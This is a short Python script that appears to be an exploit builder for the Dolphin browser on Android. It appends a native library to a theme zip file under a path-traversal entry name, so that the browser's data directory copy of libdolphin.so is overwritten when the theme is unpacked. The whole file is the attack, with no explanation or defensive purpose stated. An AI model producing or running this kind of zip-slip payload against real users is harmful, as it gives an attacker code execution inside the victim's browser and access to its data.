import zipfile
import sys

if __name__ == "__main__":
    try:
        with open("libmain.so", "r") as f:
            binary = f.read()
            theme_file = zipfile.ZipFile(sys.argv[1], "a", zipfile.ZIP_DEFLATED)
            info = zipfile.ZipInfo(sys.argv[1])
            theme_file.writestr("../../../../../../data/data/mobi.mgeek.TunnyBrowser/files/libdolphin.so", binary)
            theme_file.close()
    except IOError as e:
        raise e